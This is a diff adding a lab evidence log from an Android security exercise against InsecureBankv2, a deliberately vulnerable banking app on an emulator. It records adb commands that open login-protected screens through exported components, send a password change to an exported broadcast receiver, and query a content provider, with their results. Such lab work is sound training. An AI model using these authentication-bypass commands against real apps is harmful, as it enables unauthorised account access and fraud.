@@ -1,0 +1,53 @@
+============================================================
+Lab 2: Hardcoded Secrets & Exported Components
+Evidence Log - Authentication Bypass Exploits
+============================================================
+Date: 2026-07-13
+Target: com.android.insecurebankv2 (InsecureBankv2)
+Emulator: Pixel_8 (emulator-5554), SDK 36
+============================================================
+
+--- INSTALL APK ---
+Command: adb install --bypass-low-target-sdk-block insecurebankv2.apk
+Result: Success
+
+--- BYPASS POSTLOGIN (Main Dashboard) ---
+Command: adb shell am start -n com.android.insecurebankv2/.PostLogin
+Result: Starting: Intent { cmp=com.android.insecurebankv2/.PostLogin }
+Status: SUCCESS - Dashboard opened without login
+
+--- BYPASS DOTRANSFER (Money Transfer) ---
+Command: adb shell am start -n com.android.insecurebankv2/.DoTransfer
+Result: Starting: Intent { cmp=com.android.insecurebankv2/.DoTransfer }
+Status: SUCCESS - Transfer page opened without authentication
+
+--- BYPASS CHANGEPASSWORD ---
+Command: adb shell am start -n com.android.insecurebankv2/.ChangePassword
+Result: Starting: Intent { cmp=com.android.insecurebankv2/.ChangePassword }
+Status: SUCCESS - Change password page opened without authentication
+
+--- BYPASS VIEWSTATEMENT (Bank Statement) ---
+Command: adb shell am start -n com.android.insecurebankv2/.ViewStatement
+Result: Starting: Intent { cmp=com.android.insecurebankv2/.ViewStatement }
+Status: SUCCESS - Statement page opened without authentication
+
+--- EXPLOIT BROADCASTRECEIVER ---
+Command: adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/.MyBroadCastReceiver --es newpass "hacked_pass" --es phonenumber "08123456789"
+Result: Broadcast completed: result=0
+Status: SUCCESS - Broadcast sent to exported receiver
+
+--- CONTENT PROVIDER ACCESS ---
+Command: adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+Result: ERROR - Provider not initialized (requires app process launch)
+Status: CONFIRMED EXPORTED (accessible once app process is running)
+
+--- ENVIRONMENT INFO ---
+Android SDK: 36
+Emulator Model: Pixel_8
+ADB Status: Connected (emulator-5554)
+
+============================================================
+Total: 6 exported components confirmed
+  - 4 activities bypassed successfully (PostLogin, DoTransfer, ChangePassword, ViewStatement)
+  - 1 broadcast receiver exploited successfully (MyBroadCastReceiver)
+  - 1 content provider confirmed exported (TrackUserContentProvider)
